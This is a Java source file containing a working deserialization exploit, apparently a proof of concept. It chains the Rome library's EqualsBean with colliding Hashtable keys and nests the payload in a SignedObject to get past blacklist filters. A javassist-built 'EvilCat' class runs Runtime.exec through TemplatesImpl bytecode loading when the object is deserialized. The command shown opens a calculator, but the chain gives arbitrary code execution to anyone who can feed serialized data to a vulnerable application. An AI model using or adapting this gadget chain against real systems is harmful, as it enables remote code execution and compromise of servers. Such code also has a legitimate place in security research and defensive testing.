package com.ocean;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.security.*;
import java.util.HashMap;

import java.util.Hashtable;
public class Rome_SignedObject_EqualsBean_twice {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field f = obj.getClass().getDeclaredField(fieldName);
        f.setAccessible(true);
        f.set(obj, value);
    }
    public static CtClass getEvilClass() throws CannotCompileException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ct = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");";
        ct.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        ct.setName(randomClassName);
        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        return ct;
    }
    public static void Unser(Object obj) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
    }

    public static Hashtable getPayload(Class clazz, Object obj) throws NoSuchFieldException, IllegalAccessException {
        EqualsBean bean = new EqualsBean(String.class, "s");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", obj);
        map2.put("zZ", bean);
        map2.put("yy", obj);
        Hashtable table = new Hashtable();
        table.put(map1, "1");
        table.put(map2, "2");
        setFieldValue(bean, "_beanClass", clazz);
        setFieldValue(bean, "_obj", obj);
        return table;
    }
    public static void main(String[] args) throws NoSuchAlgorithmException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException, SignatureException, InvalidKeyException, ClassNotFoundException {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        byte[][] bytes = new byte[][]{getEvilClass().toBytecode()};
        setFieldValue(templatesImpl, "_bytecodes", bytes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templatesImpl, "_name", "x");
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        Hashtable table1 = getPayload(Templates.class, templatesImpl);
        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance("DSA"));
        Hashtable table2 = getPayload(SignedObject.class, signedObject);
        Unser(table2);
    }
}
